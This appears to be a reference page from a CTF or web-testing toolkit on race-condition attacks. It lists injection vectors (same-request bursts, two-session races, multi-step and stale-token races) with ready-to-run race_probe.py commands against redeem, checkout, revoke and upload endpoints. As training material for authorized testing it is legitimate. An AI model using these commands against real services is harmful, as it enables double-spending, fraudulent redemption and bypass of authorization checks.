# Per-vector — the injection point the race is delivered through

The vector is the request feature that carries the second request into the
window. Enumerate the injection points — most races are won by picking the
right one, not by going faster.

---

## 1. Same-request burst — N copies of one request

The default: `--url` alone, `--count N`, `--concurrency N`. Every request is
identical; the race is that two of them both read the pre-state.

```bash
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --method POST --body '{"code":"XYZ"}' -H 'Cookie: session=...' \
  --concurrency 20 --count 20 --baseline-count 5 --write-ack --challenge <name>
```

Use when: the resource is in the request itself (the code, the amount) and
N identical requests all try to consume it.

## 2. Different-requests pair — `--url-b` interleave

Request A and request B are different — different endpoint, method, or body.
The race is A's commit landing inside B's window.

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/profile"  --method POST --body '{"email":"a@x"}' -H 'Cookie: session=...' \
  --url-b "$BASE/profile" --method-b POST --body-b '{"email":"b@y"}' \
  --concurrency 2 --count 10 --baseline-count 4 --write-ack --challenge <name>
```

Use when: the crossed state needs two *different* writes (ApexSurvive
token-cross), a read racing a write (stale-read), or two different endpoints
touching one record.

## 3. Two-session vector — different cookie jars

The race is between two different accounts — the same code redeemed by two
users, the same seat booked by two buyers.

```bash
# session A
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --body '{"code":"XYZ"}' -H 'Cookie: session=A' --concurrency 1 --count 1 --no-barrier --challenge <name> &
# session B — must overlap; prime both then release
python3 tools/web/race_probe.py --url "$BASE/api/redeem" \
  --body '{"code":"XYZ"}' -H 'Cookie: session=B' --concurrency 1 --count 1 --no-barrier --challenge <name> &
wait
```

Or run one `race_probe` per session behind a shared barrier. Use when: the
resource is global but the actor is per-account (global code, one seat, one
prize).

## 4. The parameter vector — race on a field

The shared resource is a request field, not the endpoint: two requests with
the same `code=`, `item=`, `name=`, `id=`.

```bash
# race the same id — an IDOR-shape race
python3 tools/web/race_probe.py --url "$BASE/api/item/42/claim" \
  --method POST -H 'Cookie: session=...' \
  --concurrency 10 --count 10 --baseline-count 3 --write-ack --challenge <name>
```

Use when: the object id is in the path/body and the claim-once check is on
that object.

## 5. The multi-step vector — race a flow boundary

Request A is step N, request B is a different step — `checkout` racing
`cart/add`, `pay` racing `modify`.

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/checkout" --method POST -H 'Cookie: session=...' \
  --url-b "$BASE/cart/add" --method-b POST --body-b '{"item":"expensive"}' \
  --concurrency 2 --count 10 --baseline-count 4 --write-ack --challenge <name>
```

Use when: the shared record is a flow record (cart, order, session) and the
check reads it at one step while another step mutates it.

## 6. The method-mix vector — GET racing POST

A read (`GET`) racing a write (`POST`) — the stale-read / TOCTOU-on-view form.

```bash
python3 tools/web/race_probe.py \
  --url "$BASE/api/account"  --method GET  -H 'Cookie: session=...' \
  --url-b "$BASE/api/revoke" --method-b POST -H 'Cookie: session=...' \
  --concurrency 2 --count 10 --baseline-count 4 --challenge <name>
```

Use when: the bug is a stale *read* trusted by the response — a `GET` that
returns `verified:true` after `revoke` committed, or a cached read racing an
invalidate.

## 7. The header/cookie vector — race on identity

The shared resource is keyed by a header or cookie — race two requests with
the same `Authorization`, the same session cookie (two sessions "allowed" one
window each), or a rotating token.

```bash
python3 tools/web/race_probe.py --url "$BASE/api/action" \
  --method POST -H 'Authorization: Bearer OLD_TOKEN' \
  --concurrency 5 --count 5 --baseline-count 2 --write-ack --challenge <name>
```

Use when: the check reads the credential's freshness and a pre-rotation token
should be invalid but a raced request rides it in.

## 8. The upload/body vector — race on content

Two uploads or imports with the same name/path — a file-creation race over
HTTP.

```bash
python3 tools/web/race_probe.py --url "$BASE/api/upload" \
  --method POST --body 'FILEBYTES' -H 'Content-Type: multipart/form-data' \
  --concurrency 8 --count 8 --baseline-count 3 --write-ack --challenge <name>
```

Use when: the check is `exists(filename)` then `save(filename)` — two saves
for one name, or a validate-then-write path swap.

## 9. The vector→shape table

| Vector | Shared resource | Probe form |
|---|---|---|
| same-request burst | resource in the body | `--url` + `--concurrency N` |
| different-requests | one record, two writers | `--url-b` interleave |
| two-session | global resource, per-account actor | two probes, two cookies, shared barrier |
| parameter | object id in path/body | `--url` on the id |
| multi-step | flow record | `--url-b` = step N + step M |
| method-mix | cached/read view | `--url-b` GET + POST |
| header/cookie | credential freshness | `--url` with same token |
| upload/body | filename/path | `--url` with same filename |
